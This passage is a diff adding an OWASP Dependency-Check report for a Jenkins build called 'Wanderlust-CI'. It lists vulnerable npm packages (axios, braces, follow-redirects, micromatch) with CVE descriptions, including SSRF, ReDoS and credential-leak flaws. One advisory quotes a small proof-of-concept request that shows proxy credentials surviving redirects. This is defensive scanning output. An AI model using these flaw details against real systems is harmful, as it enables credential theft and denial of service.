@@ -1,0 +1,507 @@
+<?xml version="1.0"?><analysis xmlns="https://jeremylong.github.io/DependencyCheck/dependency-check.4.0.xsd"><scanInfo><engineVersion>10.0.4</engineVersion><dataSource><name>NVD API Last Checked</name><timestamp>2024-10-05T06:32:37Z</timestamp></dataSource><dataSource><name>NVD API Last Modified</name><timestamp>2024-10-05T03:15:02Z</timestamp></dataSource><analysisExceptions><exception><message>org.owasp.dependencycheck.analyzer.exception.SearchException: Could not perform Node Audit analysis. Invalid payload submitted to Node Audit API.</message><stackTrace><trace>org.owasp.dependencycheck.data.nodeaudit.NodeAuditSearch.submitPackage(NodeAuditSearch.java:209)</trace><trace>org.owasp.dependencycheck.data.nodeaudit.NodeAuditSearch.submitPackage(NodeAuditSearch.java:133)</trace><trace>org.owasp.dependencycheck.analyzer.NodeAuditAnalyzer.analyzePackage(NodeAuditAnalyzer.java:189)</trace><trace>org.owasp.dependencycheck.analyzer.NodeAuditAnalyzer.analyzeDependency(NodeAuditAnalyzer.java:146)</trace><trace>org.owasp.dependencycheck.analyzer.AbstractAnalyzer.analyze(AbstractAnalyzer.java:131)</trace><trace>org.owasp.dependencycheck.AnalysisTask.call(AnalysisTask.java:88)</trace><trace>org.owasp.dependencycheck.AnalysisTask.call(AnalysisTask.java:37)</trace><trace>java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)</trace><trace>java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1136)</trace><trace>java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:635)</trace><trace>java.base/java.lang.Thread.run(Thread.java:840)</trace></stackTrace></exception></analysisExceptions></scanInfo><projectInfo><name>Wanderlust-CI #76</name><reportDate>2024-10-05T07:50:06.329978178Z</reportDate><credits>This product uses the NVD API but is not endorsed or certified by the NVD. This report contains data retrieved from the National Vulnerability Database: https://nvd.nist.gov, Github Advisory Database (via NPM Audit API): https://github.com/advisories/, and the RetireJS community.</credits></projectInfo><dependencies><dependency isVirtual="false"><fileName>auth-controller.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/controllers/auth-controller.js</filePath><md5>57a3b1cd92f7bdf954bf3ee396834aa9</md5><sha1>786d3299e60ca04c9d9b64c783e83dfc45de758e</sha1><sha256>d1d91207a822c85b4009376ff7fc429fa316fcf44565a01f56d40ac7a81a20eb</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>auth.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/routes/auth.js</filePath><md5>17fadd7e02ce3b11bea0af6f3eab23de</md5><sha1>a1666e0b1e0c2b719a76db0a6c0e66db7de37901</sha1><sha256>307668d37ccfac1c5fdb6fcede130f3a5d34327555b36cb08614782afe2fba4e</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="true"><fileName>axios:1.6.1</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/frontend/package-lock.json?axios</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>axios</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>axios</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>1.6.1</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/axios@1.6.1</id><url>https://ossindex.sonatype.org/component/pkg:npm/axios@1.6.1?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url></package></identifiers><vulnerabilities><vulnerability source="OSSINDEX"><name>CVE-2024-39338</name><severity>HIGH</severity><cvssV3><baseScore>7.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>HIGH</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-918</cwe></cwes><description>axios 1.7.2 allows SSRF via unexpected behavior where requests for path relative URLs get processed as protocol relative URLs.</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-39338?component-type=npm&amp;component-name=axios&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url><name>[CVE-2024-39338] CWE-918: Server-Side Request Forgery (SSRF)</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-39338</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-39338</name></reference><reference><source>OSSIndex</source><url>https://github.com/advisories/GHSA-8hc4-vh64-cxmj</url><name>https://github.com/advisories/GHSA-8hc4-vh64-cxmj</name></reference><reference><source>OSSIndex</source><url>https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html</url><name>https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:axios:1.6.1:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-8hc4-vh64-cxmj</name><severity unscored="true">high</severity><cwes><cwe>CWE-918</cwe></cwes><description>axios 1.7.2 allows SSRF via unexpected behavior where requests for path relative URLs get processed as protocol relative URLs.</description><references><reference><source>NPM Advisory reference: </source><url>https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html</url><name>https://jeffhacks.com/advisories/2024/06/24/CVE-2024-39338.html</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-39338</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-39338</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/commit/6b6b605eaf73852fb2dae033f1e786155959de3a</url><name>https://github.com/axios/axios/commit/6b6b605eaf73852fb2dae033f1e786155959de3a</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-8hc4-vh64-cxmj</url><name>https://github.com/advisories/GHSA-8hc4-vh64-cxmj</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/pull/6543</url><name>https://github.com/axios/axios/pull/6543</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/releases/tag/v1.7.4</url><name>https://github.com/axios/axios/releases/tag/v1.7.4</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/releases</url><name>https://github.com/axios/axios/releases</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/pull/6539</url><name>https://github.com/axios/axios/pull/6539</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/axios/axios/issues/6463</url><name>https://github.com/axios/axios/issues/6463</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:axios:\&gt;\=1.3.2\&lt;\=1.7.3:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="true"><fileName>braces:3.0.2</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/frontend/package-lock.json?braces</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>braces</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>braces</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>3.0.2</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/braces@3.0.2</id><url>https://ossindex.sonatype.org/component/pkg:npm/braces@3.0.2?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url></package></identifiers><vulnerabilities><vulnerability source="OSSINDEX"><name>CVE-2024-4068</name><severity>HIGH</severity><cvssV3><baseScore>7.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>NONE</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>HIGH</availabilityImpact><baseSeverity>HIGH</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-1050</cwe></cwes><description>The NPM package `braces`, versions prior to 3.0.3, fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends &quot;imbalanced braces&quot; as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-4068?component-type=npm&amp;component-name=braces&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url><name>[CVE-2024-4068] CWE-1050 CWE-400</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-4068</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-4068</name></reference><reference><source>OSSIndex</source><url>https://github.com/micromatch/braces/issues/35</url><name>https://github.com/micromatch/braces/issues/35</name></reference><reference><source>OSSIndex</source><url>https://github.com/micromatch/braces/pull/37</url><name>https://github.com/micromatch/braces/pull/37</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:braces:3.0.2:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-grv7-fg5c-xmjg</name><severity unscored="true">high</severity><cvssV3><baseScore>7.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>NONE</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>HIGH</availabilityImpact><baseSeverity>HIGH</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-400</cwe><cwe>CWE-1050</cwe></cwes><description>The NPM package `braces` fails to limit the number of characters it can handle, which could lead to Memory Exhaustion. In `lib/parse.js,` if a malicious user sends &quot;imbalanced braces&quot; as input, the parsing will enter a loop, which will cause the program to start allocating heap memory without freeing it at any moment of the loop. Eventually, the JavaScript heap limit is reached, and the program will crash.
+</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/braces/issues/35</url><name>https://github.com/micromatch/braces/issues/35</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-4068</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-4068</name></reference><reference><source>NPM Advisory reference: </source><url>https://devhub.checkmarx.com/cve-details/CVE-2024-4068</url><name>https://devhub.checkmarx.com/cve-details/CVE-2024-4068</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/braces/commit/415d660c3002d1ab7e63dbf490c9851da80596ff</url><name>https://github.com/micromatch/braces/commit/415d660c3002d1ab7e63dbf490c9851da80596ff</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js#L308</url><name>https://github.com/micromatch/braces/blob/98414f9f1fabe021736e26836d8306d5de747e0d/lib/parse.js#L308</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/braces/pull/37</url><name>https://github.com/micromatch/braces/pull/37</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/braces/pull/40</url><name>https://github.com/micromatch/braces/pull/40</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-grv7-fg5c-xmjg</url><name>https://github.com/advisories/GHSA-grv7-fg5c-xmjg</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:braces:\&lt;3.0.3:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="false"><fileName>cache-posts.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/utils/cache-posts.js</filePath><md5>713461ce25b6933f70cc9547af95bd31</md5><sha1>8d8e01213a94983c497a800274e466538a858b22</sha1><sha256>2fd1b15da6f308c141e29fb19c09fa47ffb61a52e8c6c8c50cc32f1f7ef2197a</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>constants.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/utils/constants.js</filePath><md5>41ae9bdfed94fdd63b81ff81168a26d5</md5><sha1>4fa92d280bd4aaea54d31bc8f36da695a3d39e90</sha1><sha256>7fd14c311e2f810bc3d1c54c0c496feb57511311481ea5e669b6b92e90c04a94</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>cookie_options.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/utils/cookie_options.js</filePath><md5>c5a12caa580bc396270674feb5d3983e</md5><sha1>572b2622438087646bf2a1837c511ea93d7d478e</sha1><sha256>88919916ab2826ddd679129a9467402b3505f66af218481129e478bc6288af66</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>db.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/config/db.js</filePath><md5>30303fe32f803067f673162429416ef3</md5><sha1>92aa93c001f56d792a3af105a9983e608c650098</sha1><sha256>ae3b71e9610a52db46fb4c4d389899c8d39fce1793bf111cdcf16fc38375a861</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="true"><fileName>follow-redirects:1.15.3</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/frontend/package-lock.json?follow-redirects</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>follow-redirects</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>follow-redirects</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>1.15.3</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/follow-redirects@1.15.3</id><url>https://ossindex.sonatype.org/component/pkg:npm/follow-redirects@1.15.3?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url></package></identifiers><vulnerabilities><vulnerability source="OSSINDEX"><name>CVE-2024-28849</name><severity>MEDIUM</severity><cvssV3><baseScore>6.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>LOW</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-200</cwe></cwes><description>follow-redirects is an open source, drop-in replacement for Node&apos;s `http` and `https` modules that automatically follows redirects. In affected versions follow-redirects only clears authorization header during cross-domain redirect, but keep the proxy-authentication header which contains credentials too. This vulnerability may lead to credentials leak, but has been addressed in version 1.15.6. Users are advised to upgrade. There are no known workarounds for this vulnerability.
+
+Sonatype&apos;s research suggests that this CVE&apos;s details differ from those defined at NVD. See https://ossindex.sonatype.org/vulnerability/CVE-2024-28849 for details</description><references><reference><source>OSSIndex</source><url>https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-cxjh-pqwp-8mfp</url><name>https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-cxjh-pqwp-8mfp</name></reference><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-28849?component-type=npm&amp;component-name=follow-redirects&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url><name>[CVE-2024-28849] CWE-200: Information Exposure</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-28849</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-28849</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:follow-redirects:1.15.3:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-cxjh-pqwp-8mfp</name><severity unscored="true">moderate</severity><cvssV3><baseScore>6.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>LOW</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-200</cwe></cwes><description>When using [axios](https://github.com/axios/axios), its dependency follow-redirects only clears authorization header during cross-domain redirect, but allows the proxy-authentication header which contains credentials too.
+
+## Steps To Reproduce &amp; PoC
+
+Test code:
+
+```js
+const axios = require(&apos;axios&apos;);
+
+axios.get(&apos;http://127.0.0.1:10081/&apos;, {
+ headers: {
+ &apos;AuThorization&apos;: &apos;Rear Test&apos;,
+ &apos;ProXy-AuthoriZation&apos;: &apos;Rear Test&apos;,
+ &apos;coOkie&apos;: &apos;t=1&apos;
+ }
+})
+ .then((response) =&gt; {
+ console.log(response);
+ })
+```
+
+When I meet the cross-domain redirect, the sensitive headers like authorization and cookie are cleared, but proxy-authentication header is kept.
+
+## Impact
+
+This vulnerability may lead to credentials leak.
+
+## Recommendations
+
+Remove proxy-authentication header during cross-domain redirect
+
+### Recommended Patch
+
+[follow-redirects/index.js:464](https://github.com/follow-redirects/follow-redirects/commit/c4f847f85176991f95ab9c88af63b1294de8649b)
+
+```diff
+- removeMatchingHeaders(/^(?:authorization|cookie)$/i, this._options.headers);
++ removeMatchingHeaders(/^(?:authorization|proxy-authorization|cookie)$/i, this._options.headers);
+```</description><references><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-28849</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-28849</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-cxjh-pqwp-8mfp</url><name>https://github.com/advisories/GHSA-cxjh-pqwp-8mfp</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/follow-redirects/follow-redirects/commit/c4f847f85176991f95ab9c88af63b1294de8649b</url><name>https://github.com/follow-redirects/follow-redirects/commit/c4f847f85176991f95ab9c88af63b1294de8649b</name></reference><reference><source>NPM Advisory reference: </source><url>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VOIF4EPQUCKDBEVTGRQDZ3CGTYQHPO7Z</url><name>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VOIF4EPQUCKDBEVTGRQDZ3CGTYQHPO7Z</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/psf/requests/issues/1885</url><name>https://github.com/psf/requests/issues/1885</name></reference><reference><source>NPM Advisory reference: </source><url>https://hackerone.com/reports/2390009</url><name>https://hackerone.com/reports/2390009</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-cxjh-pqwp-8mfp</url><name>https://github.com/follow-redirects/follow-redirects/security/advisories/GHSA-cxjh-pqwp-8mfp</name></reference><reference><source>NPM Advisory reference: </source><url>https://fetch.spec.whatwg.org/#authentication-entries</url><name>https://fetch.spec.whatwg.org/#authentication-entries</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:follow-redirects:\&lt;\=1.15.5:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2023-26159</name><severity>MEDIUM</severity><cvssV3><baseScore>6.099999904632568</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>REQUIRED</userInteraction><scope>CHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>LOW</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-20</cwe></cwes><description>Versions of the package follow-redirects before 1.15.4 are vulnerable to Improper Input Validation due to the improper handling of URLs by the url.parse() function. When new URL() throws an error, it can be manipulated to misinterpret the hostname. An attacker could exploit this weakness to redirect traffic to a malicious site, potentially leading to information disclosure, phishing attacks, or other security breaches.</description><references><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2023-26159</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2023-26159</name></reference><reference><source>OSSIndex</source><url>https://github.com/follow-redirects/follow-redirects/issues/235</url><name>https://github.com/follow-redirects/follow-redirects/issues/235</name></reference><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2023-26159?component-type=npm&amp;component-name=follow-redirects&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url><name>[CVE-2023-26159] CWE-20: Improper Input Validation</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:follow-redirects:1.15.3:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-jchw-25xp-jwwc</name><severity unscored="true">moderate</severity><cvssV3><baseScore>6.099999904632568</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>REQUIRED</userInteraction><scope>CHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>LOW</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-601</cwe><cwe>CWE-20</cwe></cwes><description>Versions of the package follow-redirects before 1.15.4 are vulnerable to Improper Input Validation due to the improper handling of URLs by the url.parse() function. When new URL() throws an error, it can be manipulated to misinterpret the hostname. An attacker could exploit this weakness to redirect traffic to a malicious site, potentially leading to information disclosure, phishing attacks, or other security breaches.</description><references><reference><source>NPM Advisory reference: </source><url>https://security.snyk.io/vuln/SNYK-JS-FOLLOWREDIRECTS-6141137</url><name>https://security.snyk.io/vuln/SNYK-JS-FOLLOWREDIRECTS-6141137</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-jchw-25xp-jwwc</url><name>https://github.com/advisories/GHSA-jchw-25xp-jwwc</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2023-26159</url><name>https://nvd.nist.gov/vuln/detail/CVE-2023-26159</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/follow-redirects/follow-redirects/issues/235</url><name>https://github.com/follow-redirects/follow-redirects/issues/235</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/follow-redirects/follow-redirects/commit/7a6567e16dfa9ad18a70bfe91784c28653fbf19d</url><name>https://github.com/follow-redirects/follow-redirects/commit/7a6567e16dfa9ad18a70bfe91784c28653fbf19d</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/follow-redirects/follow-redirects/pull/236</url><name>https://github.com/follow-redirects/follow-redirects/pull/236</name></reference><reference><source>NPM Advisory reference: </source><url>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZZ425BFKNBQ6AK7I5SAM56TWON5OF2XM/</url><name>https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZZ425BFKNBQ6AK7I5SAM56TWON5OF2XM/</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:follow-redirects:\&lt;1.15.4:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="false"><fileName>helper-objects.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/tests/utils/helper-objects.js</filePath><md5>2ce221fa876740b2468d9ca0b0843d36</md5><sha1>aef579bf7a6de1fa2d38796485e3d87da3f7512c</sha1><sha256>7c1ad29a0ed4ab8e2299595aa435e49739ebb4a5ad9eaef83c7f6c3f7a04bfdc</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>index.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/api/index.js</filePath><md5>33110c36687d8da5fc4629bcbe1b0d79</md5><sha1>2b443b0a1404a283ba8dbc32552ba4e9a168365e</sha1><sha256>8bc2d47541a4b8ddc87390783d23040e3bb05796c31ab17eddbf72a26ead5998</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="true"><fileName>micromatch:4.0.5</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/frontend/package-lock.json?micromatch</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>micromatch</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>micromatch</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>4.0.5</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/micromatch@4.0.5</id><url>https://ossindex.sonatype.org/component/pkg:npm/micromatch@4.0.5?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url></package></identifiers><vulnerabilities><vulnerability source="OSSINDEX"><name>CVE-2024-4067</name><severity>MEDIUM</severity><cvssV3><baseScore>5.300000190734863</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>NONE</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>LOW</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-1333</cwe></cwes><description>The NPM package `micromatch` prior to 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn&apos;t find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persists. This issue should be mitigated by using a safe pattern that won&apos;t start backtracking the regular expression due to greedy matching. This issue was fixed in version 4.0.8.</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-4067?component-type=npm&amp;component-name=micromatch&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url><name>[CVE-2024-4067] CWE-1333</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-4067</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-4067</name></reference><reference><source>OSSIndex</source><url>https://security-tracker.debian.org/tracker/CVE-2024-4067</url><name>https://security-tracker.debian.org/tracker/CVE-2024-4067</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:micromatch:4.0.5:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-952p-6rrq-rcjv</name><severity unscored="true">moderate</severity><cvssV3><baseScore>5.300000190734863</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>NONE</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>LOW</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-1333</cwe></cwes><description>The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn&apos;t find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won&apos;t start backtracking the regular expression due to greedy matching.
+</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448</url><name>https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/micromatch/pull/247</url><name>https://github.com/micromatch/micromatch/pull/247</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0</url><name>https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/micromatch/pull/266</url><name>https://github.com/micromatch/micromatch/pull/266</name></reference><reference><source>NPM Advisory reference: </source><url>https://devhub.checkmarx.com/cve-details/CVE-2024-4067</url><name>https://devhub.checkmarx.com/cve-details/CVE-2024-4067</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/micromatch/releases/tag/4.0.8</url><name>https://github.com/micromatch/micromatch/releases/tag/4.0.8</name></reference><reference><source>NPM Advisory reference: 